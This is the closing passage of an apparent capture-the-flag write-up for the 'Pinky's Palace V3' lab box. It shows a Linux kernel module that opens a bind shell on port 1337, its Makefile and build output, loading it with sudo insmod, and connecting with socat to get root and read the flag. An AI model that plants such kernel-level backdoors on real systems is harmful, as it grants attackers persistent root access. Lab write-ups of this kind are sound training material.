// call_usermodehelper function is used to create user mode processes from kernel space
static int __init bind_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit bind_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(bind_shell_init);
module_exit(bind_shell_exit);
```

```makefile
obj-m +=bind-shell.o

all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Execute make to compile it.

```console
pinky@pinkys-palace:~$ make
make -C /lib/modules/4.9.0-6-686/build M=/home/pinky modules
make[1]: Entering directory '/usr/src/linux-headers-4.9.0-6-686'
  CC [M]  /home/pinky/bind-shell.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/pinky/bind-shell.mod.o
  LD [M]  /home/pinky/bind-shell.ko
make[1]: Leaving directory '/usr/src/linux-headers-4.9.0-6-686'
```

Load the module with the following command, note that port 1337 is now listening waiting for incoming connections.

```console
pinky@pinkys-palace:~$ sudo insmod bind-shell.ko 
pinky@pinkys-palace:~$ ss -antl | grep 1337
LISTEN     0      5            *:1337                     *:* 
```

Use the socat command to connect to port 1337, and a shell with root privileges is obtained.

```console
root@kali:~/pinkyspv3# socat FILE:`tty`,raw,echo=0 TCP:172.16.178.140:1337
root@pinkys-palace:/# id
uid=0(root) gid=0(root) groups=0(root)
root@pinkys-palace:/# cat root/root.txt 
 ____  _       _          _     
|  _ \(_)_ __ | | ___   _( )___ 
| |_) | | '_ \| |/ / | | |// __|
|  __/| | | | |   <| |_| | \__ \
|_|   |_|_| |_|_|\_\\__, | |___/
                    |___/       
 ____       _              __     _______ 
|  _ \ __ _| | __ _  ___ __\ \   / /___ / 
| |_) / _` | |/ _` |/ __/ _ \ \ / /  |_ \ 
|  __/ (_| | | (_| | (_|  __/\ V /  ___) |
|_|   \__,_|_|\__,_|\___\___| \_/  |____/ 
                                          
[+][+][+][+][+] R00T [+][+][+][+][+]
[+] Congrats on Pwning Pinky's Palace V3!
[+] Flag: 73b5f7ea50ccf91bb5d1ecb6aa94ef1c
[+] I hope you enjoyed and learned from this box!
[+] If you have feedback send me it on Twitter!
[+] Twitter: @Pink_P4nther
[+] Thanks to my dude 0katz for helping with testing, follow him on twitter: @0katz
root@pinkys-palace:/#
```




